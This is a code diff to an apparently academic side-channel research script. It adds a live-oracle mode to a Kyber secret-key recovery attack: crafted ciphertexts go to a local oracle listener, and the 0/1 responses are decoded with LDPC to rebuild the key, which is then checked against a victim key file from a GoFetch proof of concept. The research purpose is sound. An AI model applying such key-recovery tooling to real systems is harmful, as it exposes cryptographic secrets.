@@ -45,6 +45,8 @@ from src.kyber_encodings import (
     du,
     encoding_for_compound_split,
     entropy,
+    get_inequalities,
+    inequalities_to_split,
     k,
     marginal_pmf,
     marginal_pmfs,
@@ -53,7 +55,12 @@ from src.kyber_encodings import (
     potential_z_coefs,
     secret_joint_range,
     split_from_canonical,
-    transform_check_split,
+)
+from src.kyber_oracle import (
+    KyberOracle,
+    build_arbitrary_combination_ciphertext,
+    build_full_rotate_ciphertext,
+    read_sk,
 )
 from src.ldpc import (
     bit_tuple_to_int,
@@ -123,6 +130,8 @@ class Config:
     keys_to_test: int = 1
     base_oracle_calls: int = 7
     seed: int = 100
+    simulate_oracle: bool = True
+    port: int = 3334
 
 
 def get_config(argv) -> Config:
@@ -160,6 +169,12 @@ def get_config(argv) -> Config:
         type=str2bool,
         default=Config.use_non_zero_inequality,
         help="If true, try to search for inequalities with non-zero threshold",
+    )
+    p.add_argument(
+        "--simulate_oracle",
+        type=str2bool,
+        default=Config.simulate_oracle,
+        help="Instead of using the actual oracle, simulate it",
     )
 
     p.add_argument(
@@ -203,6 +218,12 @@ def get_config(argv) -> Config:
         type=int,
         default=Config.seed,
         help="Random seed for reproduction",
+    )
+    p.add_argument(
+        "--port",
+        type=int,
+        default=Config.port,
+        help="If oracle is not simulated, start listener on defined port to communicate (i.e. send ciphertext, get a 0/1 result)",
     )
 
     args = p.parse_args(argv)  # let argparse pull from sys.argv when argv is None
@@ -257,10 +278,11 @@ elif cfg.base_oracle_calls == 10:
     )
 else:
     raise ValueError("Unsupported number of calls for base case")
-full_rotation_split = transform_check_split(
+full_rotation_inequalities = get_inequalities(
     conf,
     database_4_full,
 )
+full_rotation_split = inequalities_to_split(full_rotation_inequalities)
 oracle_configurations.append((full_rotation_checks, full_rotation_split))
 
 oracle_calls = 0
@@ -306,7 +328,6 @@ if cfg.use_non_zero_inequality:
             )
         )
     )
-    # Z_t = np.vectorize(decompress)(np.vectorize(compress)(Z * k, du), du)
     Z_t = center(Z_t)
     Z_t = Z_t[np.sum(abs(Z_t), axis=1) < Z_BOUND]
     dot_t = S @ Z_t.T
@@ -392,6 +413,12 @@ if not cfg.use_random_shuffle:
 # print("Precomputation is done, going to the recovery")
 random.seed(cfg.seed)
 
+if not cfg.simulate_oracle and cfg.keys_to_test > 1:
+    raise ValueError("Currently can recover only one key not from simulation")
+
+if not cfg.simulate_oracle:
+    oracle = KyberOracle("127.0.0.1", cfg.port)
+
 y_statistic = defaultdict(int)
 for key_idx in range(test_keys):
     intermediate_sk = []
@@ -400,7 +427,8 @@ for key_idx in range(test_keys):
     unreliable_idxs = []
     # each 7 calls of oracle loses about 0.31941 bits compared to theory
     # lost_information = 0.31941 * (sk_len // joint_weight)
-    sk = sample_secret_coefs(sk_len)
+    if cfg.simulate_oracle:
+        sk = sample_secret_coefs(sk_len)
     all_checks = []
     check_variables = []
     pr_oracle.oracle_calls = 0
@@ -427,11 +455,27 @@ for key_idx in range(test_keys):
 
     all_checks.extend(checks)
     for check_idxs in checks:
-        enc_idx = 0
-        for var_idx in check_idxs:
-            enc_idx = enc_idx * coef_support_size + (sk[var_idx] + ETA)
-        x = check_encoding[enc_idx]
-        y = sample_coef_static(x, pr_oracle)
+        if cfg.simulate_oracle:
+            enc_idx = 0
+            for var_idx in check_idxs:
+                enc_idx = enc_idx * coef_support_size + (sk[var_idx] + ETA)
+            x = check_encoding[enc_idx]
+            y = sample_coef_static(x, pr_oracle)
+        else:
+            y = []
+            for inequality in full_rotation_inequalities:
+                z_values, thresholds, enabled, signs = inequality
+                ct = build_full_rotate_ciphertext(
+                    z_values,
+                    thresholds,
+                    enabled,
+                    signs,
+                    oracle.target_addr,
+                    oracle.rand_mask,
+                    check_idxs[0],
+                )
+                response = oracle.query(ct)
+                y.append(response)
         y_idx = bit_tuple_to_int(y)
         pmf = all_y_pmf[y_idx]
 
@@ -649,11 +693,9 @@ for key_idx in range(test_keys):
         if batch_no == additional_batches - 1:
             if cfg.print_intermediate_info:
                 print("Unreliable entries on last batch:")
-            for i, (expect, actual_pmf) in enumerate(zip(sk, sk_decoded_marginals)):
-                if max(actual_pmf) < 0.8:
-                    if cfg.print_intermediate_info:
+                for i, (expect, actual_pmf) in enumerate(zip(sk, sk_decoded_marginals)):
+                    if max(actual_pmf) < 0.8:
                         print(f"{i}: s_i = {expect}  {list_small_str(actual_pmf)}")
-                    unreliable_idxs.append(i)
         # print(f"LDPC intermediate output after batch {batch_no}:")
         # for i, (expect, pmf) in enumerate(zip(sk, sk_decoded_marginals)):
         #     print(f"{i}: sk_i={expect}, {list_small_str(pmf)}")
@@ -673,6 +715,9 @@ for key_idx in range(test_keys):
             10000,
             layered=False,
         )
+        for i, actual_pmf in enumerate(sk_decoded_marginals):
+            if max(actual_pmf) < 0.8:
+                unreliable_idxs.append(i)
         if len(unreliable_idxs) % joint_weight != 0:
             unreability = 0.81
             to_add = joint_weight - (len(unreliable_idxs) % joint_weight)
@@ -684,7 +729,8 @@ for key_idx in range(test_keys):
                         if to_add == 0:
                             break
                 unreability += 0.02
-        print(f"Adding last batch checks: {unreliable_idxs}")
+        if cfg.print_intermediate_info:
+            print(f"Adding last batch checks: {unreliable_idxs}")
         random.shuffle(unreliable_idxs)
         checks = list(
             sorted(unreliable_idxs[i * joint_weight : (i + 1) * joint_weight])
@@ -710,8 +756,6 @@ for key_idx in range(test_keys):
             channel_pmf /= sum(channel_pmf)
             check_variables.append(channel_pmf)
     time_batches_total += time.perf_counter_ns() - t2
-    differences_for_batches.append(differences_for_batch)
-    oracle_calls_for_batches.append(oracle_calls_for_batch)
 
     # with open("sk_marginals", "wb") as f:
     #     pickle.dump(sk_decoded_marginals, f)
@@ -735,8 +779,20 @@ for key_idx in range(test_keys):
         all_checks, secret_variables, check_variables, joint_weight, 10000
     )
     time_ldpc += time.perf_counter_ns() - t0
-    # print(f"{sk=}")
-    # print(f"{sk_decoded=}")
+    if cfg.record_intermediate_batches:
+        if cfg.try_fix_unreliable_on_last_batch:
+            oracle_calls_for_batch.append(pr_oracle.oracle_calls)
+            batch_diff = 0
+            for i, (expect, actual_pmf) in enumerate(zip(sk, sk_decoded)):
+                actual = np.argmax(actual_pmf) - ETA
+                if expect != actual:
+                    batch_diff += 1
+        differences_for_batch.append(batch_diff)
+        differences_for_batches.append(differences_for_batch)
+        oracle_calls_for_batches.append(oracle_calls_for_batch)
+
+    if not cfg.simulate_oracle:
+        sk = read_sk("../GoFetch/poc/crypto_victim/kyber.txt")
 
     # sk_decoded = sk_decoded_marginals
     if cfg.print_intermediate_info:
